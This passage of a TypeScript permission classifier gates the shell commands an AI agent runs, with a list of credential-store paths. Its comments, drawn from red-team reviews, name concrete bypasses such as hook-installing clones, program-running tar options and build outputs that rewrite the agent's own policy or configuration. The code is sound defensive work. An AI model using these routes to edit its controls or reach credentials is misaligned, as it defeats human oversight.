  // k8s, a database and a container the DEFAULT capability already asserts LOCAL and the resolver only ever raises
  // it; for a cloud CLI the polarity is inverted — the default IS the real provider — so LOCAL must REPLACE the
  // hit. Everything else about it stays conservative: an unparsed spelling, an opaque `$VAR`, a connection string
  // or no endpoint at all returns the hit untouched.
  if (kind === 'cloud') {
    const cloud = resolveCloudTarget(tokens, targets, envInputs);
    if (cloud.cls !== 'LOCAL' || !('cloud.local.mutate' in table.capabilities)) return hit;
    return {
      capability: 'cloud.local.mutate',
      verdict: verdictFor(table, ctx, 'cloud.local.mutate'),
      via: `target ${cloud.target} is LOCAL, a declared local development target (${targets.file})`,
      segment: norm,
      absolute: isAbsoluteCap(table, 'cloud.local.mutate'),
    };
  }
  const resolved =
    kind === 'k8s'
      ? resolveK8sTarget(tokens, targets)
      : kind === 'db'
        ? resolveDbTarget(tokens, targets, envInputs)
        : resolveContainerTarget(tokens, targets, envInputs);
  const acts =
    kind === 'db'
      ? (resolved as { executes: boolean }).executes
      : (resolved as { mutating: boolean }).mutating;
  if (!acts || resolved.cls === 'LOCAL') return hit; // reads and genuinely local work keep their verdict
  const byKind = <T,>(k8s: T, db: T, container: T): T => (kind === 'k8s' ? k8s : kind === 'db' ? db : container);
  const capability =
    resolved.cls === 'PRODUCTION'
      ? byKind('production.k8s.mutate', 'production.database.mutate', 'production.deploy')
      : resolved.cls === 'EXTERNAL'
        ? byKind('k8s.nonlocal.mutate', 'db.nonlocal.mutate', 'container.nonlocal.run')
        : byKind('k8s.target.unclassified', 'db.target.unclassified', 'container.target.unclassified');
  if (!(capability in table.capabilities)) return hit;
  return {
    capability,
    verdict: verdictFor(table, ctx, capability),
    via:
      resolved.cls === 'UNCLASSIFIED'
        ? `TARGET_UNCLASSIFIED: ${resolved.target} could not be resolved to a declared local development target (${targets.file})`
        : `target ${resolved.target} is ${resolved.cls}, not a declared local development target (${targets.file})`,
    segment: norm,
    absolute: isAbsoluteCap(table, capability),
  };
}

function classifyNormalized(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  compiled: Array<{ m: CompiledMatcher; re: RegExp }>,
  norm: string,
  state: EffectState,
): CapabilityHit[] {
  let outer: CapabilityHit | null = null;
  const additive: CapabilityHit[] = [];
  for (const { m, re } of compiled) {
    if (re.test(norm)) {
      // An ADDITIVE matcher describes something the segment ALSO does — a write destination — not what it IS.
      // Letting one win first-match terminated classification of the rest: `git clone --template=evil -o up URL`
      // matched the `--output|-o` write matcher, which sits above the `--template` hook-install deny, and a
      // single `-o` turned DENY into ALLOW while the template's hook really executed (exit review 2).
      if (m.additive) {
        additive.push({
          capability: m.capability,
          verdict: verdictFor(table, ctx, m.capability),
          via: `matcher /${m.command}/`,
          segment: norm,
          absolute: isAbsoluteCap(table, m.capability),
        });
        continue;
      }
      outer = retargetLocalCapability(
        table,
        ctx,
        {
          capability: m.capability,
          verdict: verdictFor(table, ctx, m.capability),
          via: `matcher /${m.command}/`,
          segment: norm,
          absolute: isAbsoluteCap(table, m.capability),
        },
        norm,
        state.env.envInputs,
      );
      break;
    }
  }
  if (!outer && /^["']?\$/.test(norm))
    return [
      {
        capability: 'command.script-opaque',
        verdict: verdictFor(table, ctx, 'command.script-opaque'),
        via: 'command head is a variable or substitution',
        segment: norm,
        absolute: false,
      },
    ];
  const declared = outer !== null && !OPACITY_CLASSES.has(outer.capability);
  const hits: CapabilityHit[] = [
    outer ?? {
      capability: 'command.unknown',
      verdict: verdictFor(table, ctx, 'command.unknown'),
      via: 'no matcher',
      segment: norm,
      absolute: false,
    },
    ...additive,
  ];
  if (state.depth >= MAX_EFFECT_DEPTH)
    // Analysis truncation is UNKNOWN, never "whatever the parent was". Returning the enclosing declared class let a
    // chain of indirection launder anything past the gate (challenge findings 2, 11, 20, 29, 36).
    return [...hits, opaqueHit(table, ctx, norm, `analysis truncated at depth ${MAX_EFFECT_DEPTH}`)];
  const effect = resolveScriptCommand(table, ctx, norm, state.env);
  // TYPED DISPATCH: `none` is the producer TABLE saying no producer claims this head — and it still goes THROUGH
  // the ladder, because "no producer matched" is not itself a conclusion about execution. An early return here
  // short-circuited the ladder and restored the very defect the typed dispatch was introduced to remove
  // (challenge 7, finding 20).
  if (state.seen.has(effect.key)) return hits;
  const seen = new Set(state.seen).add(effect.key);
  // THE WHOLE RULE, total over ResolutionOutcome (product decision, 2026-09-22 — "positive security claims must be
  // earned"). Exactly two outcomes carry a positive claim; every other value — including any added later — is
  // opacity, because `resolutionEffect` names the proven ones rather than enumerating the unproven ones.
  //     KNOWN + AUTHORIZED          -> execute according to policy
  //     UNKNOWN/OPAQUE + CONTAINED  -> execute inside the containment boundary   (issue #26, not built)
  //     UNKNOWN/OPAQUE + NO SANDBOX -> ASK or DENY, never silently ALLOW
  // A declared class keeps its verdict ONLY for ABSENT_VERIFIED — proof that nothing executes, so `npm test` with
  // no test script stays out of the operator's way. "My parser did not find it" is not that proof.
  // THE BINDING DIMENSION IS LIVE AND TRANSITIVE. A body resolved inside an environment whose program lookup was
  // redefined does not mean what its text says, however completely the text was read — so a positive claim there
  // is not earned, at any depth. Declaring a dimension and never consulting it is the "accepted but unconsumed"
  // defect this phase removed from doctor; it must not survive in the environment itself (challenge 7, finding 1).
  const inheritedBinding: Unresolved[] =
    state.env.binding.kind === 'redefined'
      ? [{ what: 'binding', where: norm, why: state.env.binding.why ?? 'program lookup redefined by an enclosing environment' }]
      : [];
  // SCOPED OPACITY: when the command was not classified at all, `command.unknown` already says everything an
  // extra "its closure is unmodelled" hit would, and it says it more precisely. Adding the second hit only
  // changed which capability was decisive. It cannot weaken anything: the undeclared case is already ASK.
  const { opaque: outcomeOpaque } =
    effect.resolution === 'UNKNOWN_PRODUCER' && !declared
      ? { opaque: false }
      : resolutionEffect(effect.resolution);
  const envGaps = environmentGaps(effect.kind, state.env);
  const opaque = outcomeOpaque || inheritedBinding.length > 0 || envGaps.length > 0;
  // SCOPED OPACITY: the hit names WHICH part of the execution closure is unresolved, so a reader can see what EGO
  // could not see and an organization can govern the parts separately.
  const gaps = [...(effect.unresolved ?? []), ...inheritedBinding, ...envGaps];
  const scope = gaps.length ? gaps.map((u) => `${u.what}:${u.where}`).join(', ') : effect.resolution;
  const remainder = opaque
    ? [
        opaqueHit(
          table,
          ctx,
          norm,
          `${effect.reason} [${effect.resolution}; unresolved ${scope}]`,
          true,
          // an unresolved AMBIENT producer is its own governed capability, so an organization can decide about
          // "installs run third-party code" separately from "this script is unreadable" (Q98: every lock is
          // administrable, and a lock nobody can distinguish is a lock nobody can tune)
          effect.resolution === 'AMBIENT_UNRESOLVED'
            ? 'command.ambient-unresolved'
            : effect.resolution === 'UNKNOWN_PRODUCER'
              ? 'command.unmodelled-closure'
              : 'command.script-opaque',
        ),
      ]
    : [];
  if (effect.body === null) {
    if (!declared) return remainder.length ? remainder : hits;
    return [...hits, ...remainder];
  }
  // the body resolves against ITS OWN execution environment, not the caller's — but the SAME write ledger, so a
  // write inside this body invalidates a conclusion drawn after it, one level up (transitive freshness)
  // a producer whose bodies run inside a container image says so, and the flag travels with the environment
  const bodyEnv: ExecutionEnvironment =
    effect.containerPaths === true
      ? { ...(effect.bodyEnv ?? state.env), containerPaths: true }
      : (effect.bodyEnv ?? state.env);
  // the producer's body re-enters THE SAME pipeline, with its own execution context — never a weaker sub-layer
  const inner = analyzeSegments(
    table,
    ctx,
    compiled,
    effect.body,
    { depth: state.depth + 1, seen, env: bodyEnv },
    // a script is ONE shell; make recipe lines and npm pre/post are independent shells — unless .ONESHELL hands
    // the whole recipe to one shell, which the producer reports through `oneShell`
    !(effect.oneShell ?? effect.kind === 'shell-script'),
  ).map((h) => ({ ...h, effectOf: h.effectOf ?? effect.reason }));
  if (declared) {
    // INVARIANT 1: the same action gets the same classification at any depth. An inner opacity hit is therefore
    // KEPT, whichever producer built it — `opaqueHit()`, a matcher (`command.interpreter-script`), the `$`-head
    // branch or the no-matcher fallback (`command.unknown`). A declared class no longer absorbs opacity at all,
    // and `remainder` carries the part of the execution closure that was NOT resolved, so a PARTIAL body can no
    // longer be read as the complete set of what will run.
    return [...hits, ...inner, ...remainder];
  }
  // undeclared script fully analysed: its effect replaces the unknown verdict
  const resolved = [...inner, ...remainder];
  return resolved.length ? resolved : [opaqueHit(table, ctx, norm, `${effect.reason}: empty`)];
}

/** Search tools take a PATTERN as their first operand. It is data, not the tool's own flags and paths. */
const PATTERN_FIRST_HEADS = new Set(['grep', 'egrep', 'fgrep', 'rg', 'ag', 'ack', 'ripgrep']);

/** Heads whose operands are read (or listed recursively); their path arguments are classified like Read tool calls. */
const RECURSIVE_HEADS = new Set([
  'find',
  'fd',
  'fdfind',
  'tar',
  'zip',
  'rsync',
  'du',
  'tree',
  'rg',
  'ag',
  'ack',
  'grep',
  'egrep',
  'fgrep',
  'ls',
  'cp',
  'scp',
  'chmod',
  'chown',
  'ln',
  'diff',
  'restic',
  'borg',
]);
const RECURSIVE_FLAG_RE = /^(-[a-zA-Z]*[rR][a-zA-Z]*|--recursive|--dereference-recursive)$/;
/** the credential-store directory names (first path segment under HOME) a glob under HOME could expand to */
const CREDENTIAL_DIRS = [
  '.ssh',
  '.aws',
  '.kube',
  '.gnupg',
  '.azure',
  '.netrc',
  '.npmrc',
  '.pypirc',
  '.git-credentials',
  '.config',
  '.docker',
];
/** The archive file an archiver writes/reads: `-f X`, `--file=X`, a combined short cluster ending in `f` (`-cf X`,
 *  `-czf X`, `-wf X`), or a glued value (`-fX`). Returns the archive path, or null (stdin/stdout `-` handled by caller). */
/** tar function letters that consume an argument: everything after them in the same token is their VALUE, not more
 *  function letters (`-Ccontrol-plane` is "change directory to control-plane", not "create"). */
const TAR_ARG_LETTERS = new Set(['f', 'b', 'C', 'V', 'L', 'N', 'X', 'T', 'I', 'H', 'K']);

/** The tar function letters actually requested, across the dashed (`-xf`), clustered and dash-less (`xf`) spellings. */
function tarFunctionLetters(tokens: string[]): string {
  let out = '';
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    if (t.startsWith('--')) continue;
    const body = t.startsWith('-')
      ? t.slice(1)
      : i === 1 && /^[A-Za-z]+$/.test(t)
        ? t // traditional dash-less mode operand: `tar xf a.tar`
        : '';
    for (const ch of body) {
      if (!/[A-Za-z]/.test(ch)) break;
      out += ch;
      if (TAR_ARG_LETTERS.has(ch)) break;
    }
  }
  return out;
}

function archiveFileOperand(tokens: string[]): string | null {
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    if (t === '-f' || t === '--file' || t === '-F' || t === '-O') return tokens[i + 1] ?? null;
    const eq = /^--file=(.*)$/.exec(t);
    if (eq) return eq[1]!;
    if (/^-[A-Za-z]*[fF]$/.test(t)) return tokens[i + 1] ?? null; // -cf / -czf / -wf: archive is the next operand
    const glued = /^-[A-Za-z]*[fF]([^-].*)$/.exec(t); // -fARCHIVE
    if (glued) return glued[1]!;
  }
  return null;
}

function isPathLike(tok: string, cwdIsSensitive = false): boolean {
  if (cwdIsSensitive && /^[A-Za-z0-9_.][A-Za-z0-9_.-]*$/.test(tok)) return true; // bare names resolve inside HOME
  if (tok.startsWith('.') && tok.length > 1 && !tok.startsWith('..') && !/[=]/.test(tok)) return true; // dotfiles
  return (
    tok.startsWith('~') ||
    tok.startsWith('/') ||
    tok.startsWith('$HOME') ||
    tok.startsWith('${HOME}') ||
    tok.startsWith('./') ||
    tok.startsWith('../') ||
    tok === '.' ||
    tok === '..' ||
    (tok.includes('/') && !tok.startsWith('-') && !/^https?:|^[a-z]+:\/\//.test(tok))
  );
}

function expandHome(tok: string): string | null {
  const home = homedir();
  if (tok === '~' || tok.startsWith('~/')) return home + tok.slice(1);
  if (/^~[A-Za-z0-9_.-]+/.test(tok)) return null; // another user's home: opaque
  if (tok.startsWith('$HOME')) return home + tok.slice(5);
  if (tok.startsWith('${HOME}')) return home + tok.slice(7);
  return tok;
}

/** Path-like tokens of a segment, resolved against the tracked cwd; tokens with unresolved variables are reported as dynamic. */
function pathTokens(segment: string, cwd: string): Array<{ raw: string; abs: string | null; glob: boolean }> {
  const out: Array<{ raw: string; abs: string | null; glob: boolean }> = [];
  const home = canonicalPath(homedir()).split(sep).join('/');
  const cwdIsSensitive =
    canonicalPath(cwd).split(sep).join('/') === home ||
    CREDENTIAL_DIRS.some((d) => canonicalPath(cwd).split(sep).join('/').startsWith(`${home}/${d}`));
  const allTokens = tokenize(segment);
  const head0 = (allTokens[0] ?? '').replace(/^.*\//, '');
  // A SEARCH PATTERN IS DATA. `grep 'rm -rf /' notes.md` searches for that text; reading the pattern as the
  // tool's own flags and paths denied an ordinary code search as a recursive read of `/` (exit review 5). Only
  // the FIRST non-option operand is the pattern, and only when no `-e`/`-f` names it instead.
  const patternIndex =
    PATTERN_FIRST_HEADS.has(head0) &&
    !allTokens.some((t) => /^-[a-zA-Z]*[ef]$/.test(t) || /^--(regexp|file)=/.test(t))
      ? allTokens.findIndex((t, i) => i > 0 && !t.startsWith('-'))
      : -1;
  for (const [idx, raw] of allTokens.entries()) {
    if (idx === 0 || idx === patternIndex) continue;
    const eq = raw.indexOf('=');
    const tok =
      raw.startsWith('-') && eq > 0
        ? raw.slice(eq + 1)
        : raw.startsWith('-')
          ? ''
          : /^(of|if|dest|src|file)=/.test(raw)
            ? raw.slice(eq + 1)
            : raw;
    if (!tok || !isPathLike(tok, cwdIsSensitive) || tok === '{}') continue;
    const expanded = expandHome(tok);
    if (expanded === null || /[$`]/.test(expanded)) {
      out.push({ raw: tok, abs: null, glob: false });
      continue;
    }
    const glob = /[*?[{]/.test(expanded);
    const literal = glob ? expanded.slice(0, expanded.search(/[*?[{]/)) : expanded;
    const abs = isAbsolute(literal) ? literal : resolve(cwd, literal);
    out.push({ raw: tok, abs: canonicalPath(abs), glob });
  }
  return out;
}

function globCouldReachCredentials(abs: string): boolean {
  const home = canonicalPath(homedir()).split(sep).join('/');
  const posix = abs.split(sep).join('/');
  if (!posix.startsWith(home + '/') && posix !== home) return false;
  const tail = posix.slice(home.length + 1);
  // `~/.s*` → tail ".s": a glob whose literal prefix under HOME starts a hidden name; `~/.*` → "."; `~/.{ssh,aws}` → "."
  return (
    tail === '' ||
    (tail.startsWith('.') && !tail.includes('/')) ||
    CREDENTIAL_DIRS.some((d) => (tail + '/').startsWith(d + '/'))
  );
}

/** Reads and writes implied by a shell segment's path arguments, classified like Read / Write tool calls. */
/** Commands whose operands are STRINGS, not paths: they compute a name and never touch the filesystem. */
const STRING_OPERAND_HEADS = new Set(['dirname', 'basename', 'echo', 'printf', 'expr', 'seq']);

function classifyShellPaths(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  seg: string,
  cwd: string,
  patternWords: string[] = [],
  /** the body runs inside a container image, so its PATHS are the image's — but what the analyzer cannot READ
   *  is unreadable wherever it runs, so that opacity survives */
  containerPaths = false,
  /** paths this command already created or replaced, so a name may no longer mean what it says */
  written: ReadonlySet<string> = new Set(),
): CapabilityHit[] {
  const hits: CapabilityHit[] = [];
  const tokens = tokenize(seg);
  const head0 = tokens[0] ?? '';
  const head = head0.slice(head0.lastIndexOf('/') + 1);
  if (!head || head.startsWith('$')) return hits;
  // `dirname` and `basename` MANIPULATE A STRING. They never open the path they are handed, so classifying their
  // operand as a filesystem read made `dirname -- "$0"` — the first line of a real husky hook — ask, and with it
  // every commit in that repository (exit review 4).
  if (STRING_OPERAND_HEADS.has(head)) return hits;
  const paths = pathTokens(seg, cwd).filter((p) => !patternWords.includes(p.raw));
  // a container bind mount hands the host path to the container: the SOURCE is read and written, whatever the
  // command inside the container then does. Resolving it as a path beats guessing at its spelling with a regex.
  // A KNOWN, ALLOW-classed command whose OPERAND names a program the class does not bound is not really known:
  // `tar -I /tmp/pwn`, `tar --checkpoint-action=exec=…`, `zip -TT prog`, `rsync -e prog`, `git -c *.command=…`
  // all run an arbitrary program under a friendly class. This is the fourth line of the contract — KNOWN CLASS +
  // UNBOUNDED PROGRAM OPERAND -> treat as UNKNOWN/OPAQUE (challenge finding 14).
  // `-I` names a compression PROGRAM for tar/pax but an include DIRECTORY for make and a pattern file for grep,
  // so the short form is scoped to the archive tools; the long spellings are unambiguous everywhere.
  const program =
    (PROGRAM_OPERAND_TOOL_RE.test(seg) ? PROGRAM_OPERAND_RE : PROGRAM_OPERAND_LONG_RE).exec(seg) ??
    PROGRAM_OPERAND_GLUED_RE.exec(seg);
  if (program)
    hits.push({
      capability: 'command.script-opaque',
      verdict: verdictFor(table, ctx, 'command.script-opaque'),
      via: `the option ${program[1]} names a program the command class does not bound`,
      segment: seg,
      absolute: false,
      opaqueUnread: true,
    });
  // A database client handed a program file, or carrying an in-band shell escape, executes code the kernel never
  // read: `psql -f x.sql`, `\!`, sqlite3 `.shell`/`.system`, mysql `SYSTEM`, `COPY … TO PROGRAM` (challenge
  // finding 5). This is an ADDITIONAL hit so it can never mask a stronger verdict from the target resolution.
  if (DB_CLIENT_HEADS.has(head) && DB_EXECUTES_UNREAD.test(seg))
    hits.push({
      capability: 'command.script-opaque',
      verdict: verdictFor(table, ctx, 'command.script-opaque'),
      via: 'the client runs a program or an in-band shell escape the kernel has not read',
      segment: seg,
      absolute: false,
      opaqueUnread: true,
    });
  if (head === 'docker' || head === 'podman') {
    for (const src of containerMountSources(tokenize(seg))) {
      const expanded = expandHome(src) ?? src;
      if (/[$`]/.test(expanded)) {
        hits.push({
          capability: 'command.unknown',
          verdict: verdictFor(table, ctx, 'command.unknown'),
          via: `bind mount source ${src} cannot be resolved`,
          segment: seg,
          absolute: false,
        });
        continue;
      }
      const abs = canonicalPath(isAbsolute(expanded) ? expanded : resolve(cwd, expanded));
      // a bind mount is read-write by default: judge it as BOTH, and keep whichever is more restrictive
      for (const tool of ['Write', 'Read'] as const) {
        const h = classifyPath(table, ctx, tool, abs);
        if (h.verdict !== 'ALLOW')
          hits.push({ ...h, via: `bind mount source ${src} (${h.via})`, segment: seg });
      }
      const posix = abs.split(sep).join('/');
      const homePosix = canonicalPath(homedir()).split(sep).join('/');
      if (posix === homePosix || homePosix.startsWith(posix + '/') || posix === '/')
        hits.push({
          capability: 'fs.credential-store.read',
          verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
          via: `bind mount of ${src} hands the container every credential store under it`,
          segment: seg,
          absolute: false,
        });
    }
  }
  const home = canonicalPath(homedir()).split(sep).join('/');
  const recursive =
    RECURSIVE_HEADS.has(head) &&
    ([
      'find',
      'fd',
      'fdfind',
      'tar',
      'zip',
      'rsync',
      'du',
      'tree',
      'rg',
      'ag',
      'ack',
      'restic',
      'borg',
    ].includes(head) ||
      tokens.some((t) => RECURSIVE_FLAG_RE.test(t)));
  // A BUILD TOOL'S OUTPUT FLAG IS A DESTINATION, whatever the tool. Only `-o/--output/--output-file/--out-file`
  // were read, so every bundler's own spelling wrote wherever it liked: `esbuild --outfile=.git/hooks/pre-commit`
  // installed a hook, `rollup --file .mcp.json` rewrote the agent's own configuration, `vite --outDir
  // .harness/runtime` wrote runtime state, `webpack --output-path control-plane/permissions` rewrote the policy,
  // and `docker buildx build --output type=local,dest=…` wrote anywhere on the host — all at ALLOW, while the
  // same bytes through `cp` or `>` were absolute denies (exit review 7).
  const OUTPUT_FLAGS = [
    '--output', '--output-file', '--out-file', '--outfile', '--out-dir', '--outdir', '--outDir', '--output-dir',
    '--output-directory', '--output-path', '--dist-dir', '--file', '--dest', '--destination', '--emit-to', '--out',
  ];
  const rawOutput =
    optionValue(tokenize(seg), 'o', OUTPUT_FLAGS) ??
    optionValue(
      tokenize(seg).map((t) => t.replace(/^(--[A-Za-z][A-Za-z-]*)(?==|$)/, (f) => f.toLowerCase())),
      'o',
      OUTPUT_FLAGS.map((f) => f.toLowerCase()),
    );
  // buildx spells its destination as a CSV of key=value inside the flag's own value: `--output type=local,dest=P`
  const genericOutput =
    rawOutput !== null && /(?:^|,)dest=/.test(rawOutput)
      ? (/(?:^|,)dest=([^,\s]+)/.exec(rawOutput)?.[1] ?? null)
      : (rawOutput ?? (/(?:^|[\s,])dest=([^,\s]+)/.exec(seg)?.[1] ?? null));
  const write =
    WRITE_HEADS.has(head) ||
    // an EXPLICIT output flag names a destination whatever the value looks like: `--outDir control-plane` has
    // neither a slash nor a dot in it, and the `/[/.]/` shape test below rejected it (exit review 8)
    (rawOutput !== null && rawOutput !== '' && !/^-/.test(rawOutput)) ||
    // an in-place formatter rewrites the files it is given
    (/^(shfmt|gofmt|rustfmt|clang-format|black|isort|yapf)$/.test(head) && tokens.some((t) => /^(-w|--write|-i|--in-place)$/.test(t))) ||
    (head === 'git' && /^(checkout|restore|clone|revert|cherry-pick|rm|mv)$/.test(tokens[1] ?? '')) ||
    (genericOutput !== null && /[/.]/.test(genericOutput));
  // destination of a write-ish command: last operand for cp/mv/ln/install/rsync, -C/-d dir for archives, of= for dd
  let dest: string | null = null;
  let gitPathspecs: string[] = [];
  if (write) {
    const bareOperands = (valueOpts?: RegExp): string[] => {
      // ignore redirections (`< list`, `2> err`) and their targets, then keep the bare operands even when a
      // destination is a bare name (`cd .harness/generated && cp x policy.json`)
      const operands: string[] = [];
      for (let i = 1; i < tokens.length; i++) {
        const t = tokens[i]!;
        if (/^\d*[<>]{1,2}$/.test(t) || t === '&>' || t === '>|') {
          if (!t.includes('/') && i + 1 < tokens.length) i++;
          continue;
        }
        // an option that consumes the next token must not let its VALUE pass as an operand: a trailing
        // `--sparse always` would otherwise displace the real destination (round 13)
        if (valueOpts?.test(t)) {
          i++;
          continue;
        }
        if (!t.startsWith('-')) operands.push(t);
      }
      return operands;
    };
    // `cp -l` MAKES A HARD LINK: a second name for the same inode, through which a governed file is writable by a
    // path no rule covers. `cp -l control-plane/permissions/absolute-denies.md /tmp/alias` is the same act as
    // `ln <same> /tmp/alias`, which is DENY, so both operands are judged (exit review 7).
    if (/^(shfmt|gofmt|rustfmt|clang-format|black|isort|yapf)$/.test(head)) dest = 'ALL';
    else if (head === 'cp' && tokens.some((t) => /^-[a-zA-Z]*l/.test(t))) dest = 'ALL';
    else if (head === 'tar' || head === 'bsdtar' || head === 'gtar') {
      // traditional tar also takes a DASH-LESS function-letter operand as its first argument: `tar xf a`, `tar cf a`,
      // `tar czf a` — recognise it alongside the dashed `-cf`/`-xf` forms
      const modeTok = tokens[1] && !tokens[1].startsWith('-') && /^[a-z]+$/i.test(tokens[1]) ? tokens[1] : '';
      const letters = tarFunctionLetters(tokens);
      // every archive-WRITING mode: create (c), append (r), update (u), catenate (A) — not just create
      const writeMode =
        tokens.some(
          (t) =>
            t === '--create' ||
            t === '--append' ||
            t === '--update' ||
            t === '--catenate' ||
            t === '--concatenate',
        ) || /[cruA]/.test(letters);
      const extract =
        tokens.some((t) => t === '--extract' || t === '--get') || /x/.test(letters);
      if (writeMode) {
        // dash-less `cf`/`czf`/`rf`/`cbf`: the archive is `f`'s positional argument. Function letters before `f` that
        // themselves consume an argument (b blocking-factor, V volume, L length, N newer, X exclude, T files-from)
        // shift it, so `tar cbf 20 ARCHIVE` has its archive at tokens[3], not tokens[2].
        let arc = archiveFileOperand(tokens);
        if (!arc && modeTok && /f/.test(modeTok)) {
          const argLetters = new Set(['f', 'b', 'V', 'L', 'N', 'X', 'T']);
          let before = 0;
          for (const ch of modeTok) {
            if (ch === 'f') break;
            if (argLetters.has(ch)) before++;
          }
          arc = tokens[2 + before] ?? null;
        }
        dest = arc && arc !== '-' ? arc : null; // writing the archive is a write to that path
      } else if (extract) {
        // the change-directory flag has several spellings: -C DIR, -CDIR, -xCDIR, --directory DIR, --directory=DIR,
        // --cd DIR, and --one-top-level[=DIR] creates and extracts into its own directory
        dest =
          optionValue(tokens, 'C', ['--directory', '--cd', '--one-top-level']) ?? '.'; // else the working directory
      } else dest = null; // list / compare: read-only
    } else if (head === 'zip') {
      const operands = bareOperands();
      dest = operands.length ? operands[0]! : null; // zip writes its archive: the first non-option operand
    } else if (head === 'unzip') {
      dest = optionValue(tokens, 'd', ['--exdir']) ?? '.';
    } else if (head === 'find') {
      // find's own write actions: -fprint/-fprint0/-fls FILE and -fprintf FILE FORMAT
      const i = tokens.findIndex((t) => t === '-fprint' || t === '-fprint0' || t === '-fls' || t === '-fprintf');
      dest = i >= 0 ? (tokens[i + 1] ?? null) : null;
    } else if (head === 'dd') dest = tokens.find((t) => t.startsWith('of='))?.slice(3) ?? null;
    else if (head === 'pax') {
      const wmode = tokens.some((t) => t === '-w' || /^-[A-Za-z]*w/.test(t)); // -w, -rw, -wf all write
      const arc = archiveFileOperand(tokens);
      if (wmode && arc) dest = arc !== '-' ? arc : null; // `pax -w -f ARCHIVE`: writes the archive
      else {
        const operands = bareOperands();
        // `pax -r -w SRC... DEST` copies into the last operand; `-r` alone (extract) has no path destination here
        dest = wmode && operands.length ? operands[operands.length - 1]! : null;
      }
    } else if (head === 'mv' || head === 'rename') {
      // mv/rename remove the source AND create the destination: every operand is a write (moving `.harness` away,
      // renaming a protected file over another) — the source side is not merely a read
      dest = 'ALL';
    } else if (head === 'sort') {
      // `sort -o FILE` / `sort -oFILE` / `sort --output=FILE` writes FILE (in place, even when FILE is an input too)
      dest = optionValue(tokens, 'o', ['--output']);
    } else if (head === 'uniq') {
      // `uniq [input [output]]`: a second bare operand is the output file
      const operands = bareOperands();
      dest = operands.length >= 2 ? operands[operands.length - 1]! : null;
    } else if (head === 'yq') {
      // `yq -i/--inplace … FILE` edits FILE in place
      const inplace = tokens.some((t) => t === '-i' || t === '--inplace' || /^-[a-zA-Z]*i$/.test(t));
      const operands = bareOperands();
      dest = inplace && operands.length ? operands[operands.length - 1]! : null;
    } else if (['cp', 'install', 'rsync', 'scp', 'gcp', 'gmv', 'ditto', 'cpio'].includes(head)) {
      const operands = bareOperands(copyValueOpts(head));
      // `-t DIR` / `--target-directory=DIR` moves the destination off the operand list entirely: every operand is
      // then a source and DIR is what gets written (round 13)
      const targetDir = optionValue(
        tokens,
        ['cp', 'install', 'mv', 'gcp', 'gmv'].includes(head) ? 't' : '',
        ['--target-directory'],
      );
      // cpio -p reads its file list from stdin and copies INTO its sole operand; cp/rsync/... write the last operand
      dest = targetDir
        ? targetDir
        : operands.length
          ? head === 'cpio'
            ? operands[0]!
            : operands[operands.length - 1]!
          : null;
    } else if (head === 'git') {
      // `git checkout|restore <ref> -- <paths>` writes the paths — AND SO DOES THE SPELLING WITHOUT `--`, which
      // git documents as optional. `git checkout HEAD~1 control-plane/permissions/matchers.md` rewrote the policy
      // that decides every later verdict and `git checkout origin/evil .harness` replaced the whole governance
      // tree, both at ALLOW, while adding two characters made each an absolute deny (exit review 7). Without the
      // disambiguator the first operand may be a TREE-ISH; a bare name with no `/` or `.` is read as one, and
      // everything after it is a pathspec.
      const sub = tokens[1];
      const dd = tokens.indexOf('--');
      // `git rm` DELETES the files it names, and the matcher that classifies it is an ALLOW capability. Its
      // pathspecs were never judged, so `git rm -r control-plane` removed the policy that decides every later
      // verdict (exit review 8). Same shape as checkout's pathspecs, minus the tree-ish.
      if (sub === 'rm' || sub === 'mv') {
        const specs = tokens.slice(2).filter((t) => !t.startsWith('-'));
        if (specs.length) {
          gitPathspecs = specs;
          dest = 'ALL_PATHSPECS';
        } else dest = null;
      } else if ((sub === 'checkout' || sub === 'restore') && dd > 0) dest = 'AFTER_DASHDASH';
      else if (sub === 'checkout' || sub === 'restore') {
        const rest = tokens.slice(2).filter((t) => !t.startsWith('-'));
        const specs = rest.length > 1 && !/[/.]/.test(rest[0] ?? '') ? rest.slice(1) : rest;
        // `-b`/`-B`/`-t` name a BRANCH, not a path, and those spellings create nothing in the working tree
        // every pathspec is a destination, so the whole list is judged rather than only the first
        dest = specs.length && !tokens.some((t) => /^-[a-zA-Z]*[bB]$/.test(t)) ? 'ALL_PATHSPECS' : null;
        if (dest) gitPathspecs = specs;
      } else if (sub === 'clone') {
        // `git clone URL DIR` creates DIR from a remote tree: `git clone … node_modules/.bin` replaces the
        // directory every locally installed binary is resolved from
        const rest = tokens.slice(2).filter((t) => !t.startsWith('-'));
        dest = rest.length > 1 ? (rest[rest.length - 1] ?? null) : null;
      } else if (/^(revert|cherry-pick)$/.test(sub ?? '')) {
        // A REVERT REWRITES WHATEVER THE NAMED COMMIT TOUCHED — a set the command line does not enumerate, but
        // one git will tell us. Resolving it beats both blanket answers: DENY made an everyday act an absolute
        // deny in any governed repository, and ALLOW let `git revert <the commit that hardened the control
        // plane>` undo a matcher with no human involved (exit review 7). What the commit touched is judged as
        // the write it is; a commit-ish this kernel cannot resolve stays the destructive class it already has.
        const revs = tokens.slice(2).filter((t) => !t.startsWith('-'));
        const touched: string[] = [];
        for (const rev of revs.slice(0, 4)) {
          if (!/^[A-Za-z0-9_./^~@{}-]+$/.test(rev)) continue;
          const show = git(['show', '--name-only', '--pretty=format:', rev], cwd);
          if (show.ok) touched.push(...show.stdout.split(/\r?\n/).map((l) => l.trim()).filter(Boolean));
        }
        if (touched.length) {
          gitPathspecs = [...new Set(touched)];
          dest = 'ALL_PATHSPECS';
        } else dest = null;
      } else dest = null;
    } else if (head === 'patch') {
      // `patch -o FILE` / `patch -oFILE` / `patch --output=FILE` writes FILE instead of the patched originals
      dest = optionValue(tokens, 'o', ['--output']) ?? 'ALL';
    } else if (
      [
        'tee',
        'truncate',
        'touch',
        'chmod',
        'chown',
        'rm',
        'mkdir',
        'rmdir',
        'sed',
        'gsed',
        'perl',
        'ruby',
        'ln',
        'shred',
        'unlink',
        'rename',
        'patch',
      ].includes(head) ||
      // `cp -l` makes a HARD LINK: a second name for the same inode, through which a governed file is writable
      // by a path no rule covers (exit review 7)
      (head === 'cp' && tokens.some((t) => /^-[a-zA-Z]*l/.test(t)))
    )
      // for ln (and `cp -l`, which makes the same second name for the same inode) EVERY operand counts: a link
